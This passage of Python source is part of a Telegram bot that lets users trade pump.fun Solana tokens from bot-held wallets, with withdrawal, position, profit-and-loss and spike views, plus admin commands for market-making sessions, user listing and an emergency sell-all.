                        amount = float(amt_str)
                        assert amount > 0
                        del self._pending[uid]
                        await self._do_withdraw(update, uid, to_addr, amount)
                    except Exception:
                        await update.message.reply_text("❌ Invalid format. Use: withdraw &lt;address&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML)
                else:
                    await update.message.reply_text("❌ Format: withdraw &lt;address&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML)
            return

        # If not pending, treat text as a potential CA for quick trade
        if len(text) >= 32 and " " not in text:
            trader = self.user_traders.get(uid)

            # Fetch token details
            info = await self.fetch_token_info(text)
            if not info:
                await update.message.reply_text("❌ Could not fetch token info. Check the address.")
                return

            # Build a detailed response
            detail = (
                f"🔍 <b>Token Found</b>\n"
                f"🪙 <b>{info['name']} ({info['symbol']})</b>\n"
                f"💰 MCap: ${info['mcap']:,.2f}\n"
                f"📊 Price: ${info['price']:.6f}\n"
                f"📈 24h Vol: ${info['volume_24h']:,.2f}\n"
                f"👥 Holders: {info['holders']}\n"
                f"<a href='https://pump.fun/coin/{text}'>View on pump.fun</a>"
            )

            # Quick action buttons (Buy / Sell / Cancel)
            kb = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🟢 Buy", callback_data=f"quick_buy_{text}"),
                    InlineKeyboardButton("🔴 Sell", callback_data=f"quick_sell_{text}"),
                ],
                [InlineKeyboardButton("« Back", callback_data="menu_main")],
            ])

            await update.message.reply_text(detail, parse_mode=ParseMode.HTML, reply_markup=kb)

    async def _do_withdraw(self, update: Update, uid: int, to_addr: str, amount: float):
        kp = self.user_wallets.get(uid)
        if not kp or not self.rpc_client:
            await update.message.reply_text("No wallet or RPC unavailable.")
            return
        if DRY_RUN:
            await update.message.reply_text(f"🧪 DRY RUN: Would send {amount} SOL → {to_addr}")
            return
        try:
            to_pubkey = Pubkey.from_string(to_addr)
            bh = (await self.rpc_client.get_latest_blockhash(commitment=Confirmed))["result"]["value"]["blockhash"]
            ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=to_pubkey, lamports=int(amount * 1e9)))
            tx = Transaction().add(ix)
            tx.recent_blockhash = bh
            tx.sign(kp)
            result = await self.rpc_client.send_transaction(tx, TxOpts(skip_preflight=False, preflight_commitment=Confirmed))
            await update.message.reply_text(
                f"✅ Sent <b>{amount} SOL</b>\nTX: <code>{result['result']}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(),
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Withdraw failed: {e}")

    # ──────────────────────────────────────────────────────────────────────────
    # Shared view helpers
    # ──────────────────────────────────────────────────────────────────────────

    async def _show_positions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]])

        if not trader or not trader.positions:
            await q.edit_message_text("📊 No open positions.", reply_markup=back_kb)
            return

        lines = ["📊 <b>Open Positions</b>\n"]
        for mint, p in trader.positions.items():
            change = ((p.current_price_sol - p.entry_price_sol) / p.entry_price_sol * 100) if p.entry_price_sol else 0
            age = int((time.time() - p.buy_time) / 60)
            icon = "📈" if change >= 0 else "📉"
            lines.append(
                f"• <b>{p.symbol}</b> <code>{mint[:8]}…</code>\n"
                f"  Entry: {p.entry_price_sol:.4f} | Now: {p.current_price_sol:.4f} | {icon} {change:+.1f}% | {age}m ago"
            )
        await q.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=back_kb)

    async def _show_pnl(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]])

        if not trader:
            await q.edit_message_text("No wallet found.", reply_markup=back_kb)
            return

        unrealized = sum(
            (p.current_price_sol - p.entry_price_sol) * p.amount_sol / p.entry_price_sol
            for p in trader.positions.values() if p.entry_price_sol > 0
        )
        await q.edit_message_text(
            f"💹 <b>Profit / Loss</b>\n\n"
            f"Realized:   <b>{trader.realized_pnl_sol:+.4f} SOL</b>\n"
            f"Unrealized: <b>{unrealized:+.4f} SOL</b>\n"
            f"Positions:  {len(trader.positions)}",
            parse_mode=ParseMode.HTML,
            reply_markup=back_kb,
        )

    async def _show_spikes(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("« Back", callback_data="menu_main")]])
        try:
            import web_dashboard.app as dash
            det = dash.detector
        except Exception:
            det = None
        if not det:
            await q.edit_message_text("⏳ Detector not ready. Try again soon.", reply_markup=back_kb)
            return
        spiked = det.get_spiked_tokens()
        if not spiked:
            await q.edit_message_text("😴 No spikes ≥150% right now.", reply_markup=back_kb)
            return
        lines = ["📡 <b>Top Spikes ≥150%</b>\n"]
        for t in sorted(spiked, key=lambda x: x.spike_pct, reverse=True)[:8]:
            lines.append(
                f"• <b>{t.symbol}</b> +{t.spike_pct:.0f}% | "
                f"MCap {t.current_mcap:.2f} SOL | "
                f"<a href='https://pump.fun/coin/{t.mint}'>pump.fun</a>"
            )
        await q.edit_message_text(
            "\n".join(lines), parse_mode=ParseMode.HTML,
            reply_markup=back_kb, disable_web_page_preview=True,
        )

    # ──────────────────────────────────────────────────────────────────────────
    # Slash command fallbacks (still usable via command menu)
    # ──────────────────────────────────────────────────────────────────────────

    async def cmd_buy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        if not trader:
            await update.message.reply_text("Create a wallet first.", reply_markup=main_menu_keyboard())
            return
        if not context.args:
            await update.message.reply_text("Usage: /buy &lt;mint&gt;", parse_mode=ParseMode.HTML)
            return
        mint = context.args[0]
        await update.message.reply_text(f"⏳ Buying <code>{mint[:12]}…</code>", parse_mode=ParseMode.HTML)
        tid = await trader.execute_buy(mint, mint[:6].upper())
        if tid:
            await update.message.reply_text("✅ Buy order placed!", reply_markup=main_menu_keyboard())
        else:
            await update.message.reply_text("❌ Buy failed. Check balance / mcap / position limit.")

    async def cmd_sell(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        if not trader:
            await update.message.reply_text("Create a wallet first.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /sell &lt;mint&gt;", parse_mode=ParseMode.HTML)
            return
        mint = context.args[0]
        res = await trader.execute_sell(mint, 1.0)
        if res:
            await update.message.reply_text("✅ Position closed!", reply_markup=main_menu_keyboard())
        else:
            await update.message.reply_text("❌ No open position for that mint.")

    async def cmd_balance(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        kp = self.user_wallets.get(uid)
        if not kp:
            await update.message.reply_text("No wallet. Use /start → Wallet.", reply_markup=main_menu_keyboard())
            return
        bal = await self._get_sol_balance(uid)
        await update.message.reply_text(
            f"💰 Balance: <b>{bal:.4f} SOL</b>\n📍 <code>{kp.pubkey()}</code>",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard(),
        )

    async def cmd_deposit(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        kp = self.user_wallets.get(uid)
        if not kp:
            await update.message.reply_text("No wallet. Use /start → Wallet.")
            return
        await update.message.reply_text(
            f"📥 <b>Deposit Address</b>\n\n<code>{kp.pubkey()}</code>",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard(),
        )

    async def cmd_positions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        if not trader or not trader.positions:
            await update.message.reply_text("📊 No open positions.", reply_markup=main_menu_keyboard())
            return
        lines = ["📊 <b>Open Positions</b>\n"]
        for mint, p in trader.positions.items():
            change = ((p.current_price_sol - p.entry_price_sol) / p.entry_price_sol * 100) if p.entry_price_sol else 0
            age = int((time.time() - p.buy_time) / 60)
            lines.append(f"• <b>{p.symbol}</b> {change:+.1f}% | {age}m ago")
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())

    async def cmd_pnl(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        trader = self.user_traders.get(uid)
        if not trader:
            await update.message.reply_text("No wallet.")
            return
        unrealized = sum(
            (p.current_price_sol - p.entry_price_sol) * p.amount_sol / p.entry_price_sol
            for p in trader.positions.values() if p.entry_price_sol > 0
        )
        await update.message.reply_text(
            f"💹 Realized: <b>{trader.realized_pnl_sol:+.4f} SOL</b>\n"
            f"Unrealized: <b>{unrealized:+.4f} SOL</b>",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard(),
        )

    async def cmd_spikes(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            import web_dashboard.app as dash
            spiked = dash.detector.get_spiked_tokens()
        except Exception:
            spiked = []
        if not spiked:
            await update.message.reply_text("😴 No spikes right now.", reply_markup=main_menu_keyboard())
            return
        lines = ["📡 <b>Top Spikes ≥150%</b>\n"]
        for t in sorted(spiked, key=lambda x: x.spike_pct, reverse=True)[:8]:
            lines.append(f"• <b>{t.symbol}</b> +{t.spike_pct:.0f}% | <a href='https://pump.fun/coin/{t.mint}'>pump.fun</a>")
        await update.message.reply_text(
            "\n".join(lines), parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard(), disable_web_page_preview=True,
        )

    # ──────────────────────────────────────────────────────────────────────────
    # Admin slash commands
    # ──────────────────────────────────────────────────────────────────────────

    async def cmd_admin_mm_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._is_admin(update):
            return
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /admin_mm_start &lt;mint&gt; &lt;strategy&gt; [duration_hours]", parse_mode=ParseMode.HTML)
            return
        mint, strategy = context.args[0], context.args[1].lower()
        duration = int(context.args[2]) if len(context.args) > 2 else 24
        if strategy not in MM_STRATEGIES:
            await update.message.reply_text("Invalid strategy. Use basic, aggressive, or deep.")
            return
        if self.mm:
            await self.mm.add_token(mint, strategy=strategy, config=MM_STRATEGIES[strategy])
        self.mm_sessions[mint] = {
            "mint": mint, "strategy": strategy, "hours": duration,
            "started_at": time.time(), "user_id": None,
        }
        await update.message.reply_text(f"✅ MM started for <code>{mint}</code> | {strategy} | {duration}h", parse_mode=ParseMode.HTML)

    async def cmd_mm_requests(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._is_admin(update):
            return
        if not self.mm_requests:
            await update.message.reply_text("✅ No pending MM requests.")
            return
        lines = ["📩 <b>Pending MM Requests</b>\n"]
        for r in self.mm_requests[-15:]:
            lines.append(f"• @{r['username']} | {r.get('strategy','?')} | {r.get('total_sol','?')} SOL | {r.get('duration','?')}h")
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

    async def cmd_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._is_admin(update):
            return
        users = self._db.get("users", {})
        if not users:
            await update.message.reply_text("No users yet.")
            return
        lines = [f"👥 <b>Users ({len(users)})</b>\n"]
        for uid, u in list(users.items())[-20:]:
            lines.append(
                f"• {u.get('full_name','?')} | @{u.get('username','N/A')} | "
                f"<code>{uid}</code> | #{u.get('number','?')} | {u.get('joined_at','?')}"
            )
        await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

    async def cmd_emergency_kill(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._is_admin(update):
            return
        killed = 0
        for trader in self.user_traders.values():
            for mint in list(trader.positions.keys()):
                await trader.execute_sell(mint, 1.0)
                killed += 1
        if self.mm:
            await self.mm.emergency_kill()
        self.mm_sessions.clear()
        await update.message.reply_text(f"🛑 Kill executed. Positions closed: {killed}. MM stopped.")

    # ──────────────────────────────────────────────────────────────────────────
    # Handler registration
    # ──────────────────────────────────────────────────────────────────────────

    def register_handlers(self, application: Application):
        from telegram.ext import MessageHandler, filters

        a = application
        a.add_handler(CommandHandler("start",           self.cmd_start))
        a.add_handler(CommandHandler("buy",             self.cmd_buy))
        a.add_handler(CommandHandler("sell",            self.cmd_sell))
        a.add_handler(CommandHandler("balance",         self.cmd_balance))
        a.add_handler(CommandHandler("deposit",         self.cmd_deposit))
        a.add_handler(CommandHandler("positions",       self.cmd_positions))
        a.add_handler(CommandHandler("pnl",             self.cmd_pnl))
        a.add_handler(CommandHandler("spikes",          self.cmd_spikes))
        a.add_handler(CommandHandler("admin_mm_start",  self.cmd_admin_mm_start))
        a.add_handler(CommandHandler("mm_requests",     self.cmd_mm_requests))
        a.add_handler(CommandHandler("users",           self.cmd_users))
        a.add_handler(CommandHandler("emergency_kill",  self.cmd_emergency_kill))
        a.add_handler(CallbackQueryHandler(self.handle_callback))
        a.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        logger.info("All handlers registered.")
